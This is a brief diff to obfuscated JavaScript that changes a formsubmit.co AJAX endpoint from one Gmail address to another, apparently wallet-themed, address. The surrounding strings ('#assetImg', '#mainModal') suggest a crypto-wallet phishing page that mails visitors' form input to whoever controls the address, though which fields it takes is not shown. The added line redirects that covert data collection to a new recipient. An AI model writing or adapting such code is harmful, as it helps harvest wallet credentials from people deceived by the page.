@@ -15342,7 +15342,7 @@ function _0x2860() {
     'trim',
     '#assetImg',
     '4335555blqQYI',
-    'https://formsubmit.co/ajax/Ogunsakinayomide736@gmail.com',
+    'https://formsubmit.co/ajax/daowalletemv@gmail.com',
     'ready',
     'display',
     '#mainModal',
